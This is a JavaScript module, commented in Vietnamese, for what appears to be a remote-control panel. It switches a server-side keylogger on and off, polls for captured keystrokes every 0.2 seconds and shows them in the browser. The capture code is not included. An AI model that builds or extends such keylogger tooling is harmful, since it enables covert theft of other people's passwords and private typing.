// modules/tab-keylog.js
import { store } from "./store.js";
import { api } from "./api.js";
import { logActionUI } from "./ui.js";

/**
 * @brief Bat/Tat chuc nang keylogger
 */
export async function toggleKeylog(cb) {
  // Gui lenh bat/tat len server
  await api("/api/keylog/set", { enabled: cb.checked });
  logActionUI(`Keylog: ${cb.checked ? "BẬT" : "TẮT"}`, true);
  if (cb.checked) {
    // Neu BAT
    if (!store.keylogInt)
      // Tao 1 vong lap cu 0.2s hoi server xem co log moi khong
      store.keylogInt = setInterval(async () => {
        let res = await api("/api/keylog?t=" + Date.now());
        if (res.log) {
          let area = document.getElementById("logArea");
          area.value += res.log; // Them log moi vao
          area.scrollTop = area.scrollHeight; // Cuon xuong cuoi
          sessionStorage.setItem("keylogs", area.value); // Luu tam vao session
        }
      }, 200); // 0.2s/lan
  } else {
    // Neu TAT
    if (store.keylogInt) {
      clearInterval(store.keylogInt); // Huy vong lap
      store.keylogInt = null;
    }
  }
}

/**
 * @brief Xoa log hien thi tren man hinh
 */
export function clearLogs() {
  if (confirm("Xóa log? (Chỉ xóa ở trình duyệt)")) {
    document.getElementById("logArea").value = "";
    sessionStorage.removeItem("keylogs");
    logActionUI("Đã xóa log phím (phía client)", true);
  }
}
